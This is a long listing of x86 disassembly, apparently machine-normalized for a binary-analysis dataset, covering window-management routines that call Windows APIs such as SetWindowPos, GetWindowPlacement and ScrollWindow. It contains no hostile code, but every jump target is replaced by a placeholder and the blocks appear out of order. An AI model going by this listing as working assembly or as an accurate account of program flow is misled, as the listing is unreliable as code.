jne r-xdata
sub_45bb20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_45d4a8
mov edx esi
mov eax ebx
call sub_45ba8c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_456c00
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_456c00
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_456c00
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_46cc58
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_456c00
test eax eax
jne r-xdata
jmp r-xdata
sub_45bc04
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_456c00
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_45bc58
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_456c00
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_46cc58
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_456c00
test eax eax
jne r-xdata
sub_45bca4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_45ba8c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_456c00
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_46cc58
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_456c00
test eax eax
jne r-xdata
sub_45bd00
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_46cc58
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_456c00
mov [ esi + 0xc ] eax
sub_45bd34
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4550a0
mov eax ebx
mov si 0xffd0
call sub_4033e8
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4553ec
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45be0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_45903c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4033e8
inc edi
dec ebx
jne r-xdata
sub_45be54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458be0
xor eax eax
push ebp
push sub_45bef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45be0c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bef9
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45bf00
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_458c08
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_45903c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_45bff0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_418e20
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418cb4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_418e40
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418dc4
call sub_45c380
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418dc4
call sub_45c380
sub_45c0c8
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_45bff0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_45c128
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_45c380
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_45c380
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
test eax eax
jne r-xdata
sub_45c1c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_456c00
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov eax ebx
call sub_459078
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_45903c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_45903c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_45c288
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4553ec
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_45c2c0
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_46cc58
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_45c300
push ebx
mov ebx eax
mov eax ebx
call sub_46cc58
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_4709c4
pop ebx
retn
mov eax ebx
call sub_46cc80
mov eax ebx
call sub_45c380
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_45c338
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45c35c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_45c35c
sub_45c394
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41776c
mov eax edi
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_45903c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_45c428
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_45c380
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_45c460
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45c684
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4033e8
sub_45c51c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_418e20
pop esi
pop ebx
retn
sub_45c540
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c51c
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418cb4
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_418e40
sub_45c5b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_45c684
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_456c00
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_45c614
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45c678
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c67f
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4033e8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4058b8
sub_45c690
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4550a0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_45c748
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418dc4
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418c68
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4033e8
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_45c7a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45c89e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4033e8
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c8a5
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_418e20
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418dc4
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_45c8b4
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_45c7a8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45c8e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_45c928
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45bff0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_455cbc
sub_45c970
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45c9f4
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_459078
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_45cdb6
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_459078
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_45c970
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
